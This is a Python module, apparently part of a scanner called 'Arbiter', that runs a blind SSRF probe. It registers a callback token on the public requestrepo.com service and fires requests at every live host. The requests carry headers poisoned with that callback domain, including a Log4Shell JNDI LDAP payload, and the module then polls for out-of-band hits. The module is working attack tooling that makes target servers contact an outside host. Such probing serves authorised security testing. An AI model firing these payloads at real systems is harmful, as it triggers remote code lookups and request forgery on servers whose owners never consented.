import requests
import time
import logging
from rich.console import Console
from rich.panel import Panel
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()
log = logging.getLogger("rich")

def run_oast(session, config):
    """
    Phase 4.8: Blind SSRF (OAST Protocol)
    Injects Out-of-Band payloads into headers to hunt for backend request forgery.
    """
    console.print("[bold blue]━━ PHASE 4.8: BLIND SSRF (OAST PROTOCOL) ━━[/bold blue]")

    if not session.live_hosts:
        log.warning("No live hosts for OAST testing. Skipping.")
        return

    # 1. Register OAST Session
    try:
        console.print("INFO     Initializing OAST Server (RequestRepo)...")
        r = requests.post("https://requestrepo.com/api/get_token", timeout=10)
        token = r.json().get('token')
        if not token:
            raise Exception("Failed to retrieve token")
        
        oast_domain = f"{token}.requestrepo.com"
        oast_url = f"http://{oast_domain}"
        console.print(f"[cyan]  + OAST Payload Generated: {oast_domain}[/cyan]")
    except Exception as e:
        log.error(f"Failed to initialize OAST server: {e}")
        return

    # 2. Poison Headers
    headers = {
        "User-Agent": f"Arbiter/2.0 ({oast_url})",
        "Referer": oast_url,
        "X-Forwarded-For": oast_domain,
        "X-Real-IP": oast_domain,
        "Contact": oast_url,
        "X-Api-Version": f"${{jndi:ldap://{oast_domain}/a}}" # Log4Shell Canary
    }

    console.print(f"INFO     Firing Blind SSRF payloads at {len(session.live_hosts)} targets...")
    
    for host in session.live_hosts:
        target = host.get('url')
        if not target: continue
        
        try:
            requests.get(target, headers=headers, timeout=3, verify=False)
        except Exception:
            pass

    # 3. Wait for Callbacks (Some backend queues take time)
    console.print("INFO     Awaiting Out-of-Band callbacks (10 seconds)...")
    time.sleep(10)

    # 4. Poll for Results
    try:
        poll = requests.get(f"https://requestrepo.com/api/get_requests?token={token}", timeout=10)
        interactions = poll.json()
        
        if interactions:
            console.print(Panel(
                f"[bold red]CRITICAL: BLIND SSRF / OOB INTERACTION DETECTED[/bold red]\n"
                f"Payload Triggered: {oast_domain}\n"
                f"Interactions Logged: {len(interactions)}\n"
                f"Action: Review logs manually to identify vulnerable host.",
                title="❌ OUT-OF-BAND HIT", border_style="red"
            ))
            session.vulnerabilities.append({
                "name": "Server-Side Request Forgery (Blind SSRF)",
                "severity": "CRITICAL",
                "url": "Multiple (Check OAST Dashboard)",
                "info": f"OAST callback received. View full HTTP trace at: https://requestrepo.com/#/{token}"
            })
        else:
            console.print("[green]  + No immediate OAST callbacks detected.[/green]")
            console.print(f"[dim]  + Note: Some backend jobs take hours. Save this link to check later:[/dim]")
            console.print(f"[dim]  + Dashboard: https://requestrepo.com/#/{token}[/dim]")
            
    except Exception as e:
        log.error(f"Failed to poll OAST server: {e}")
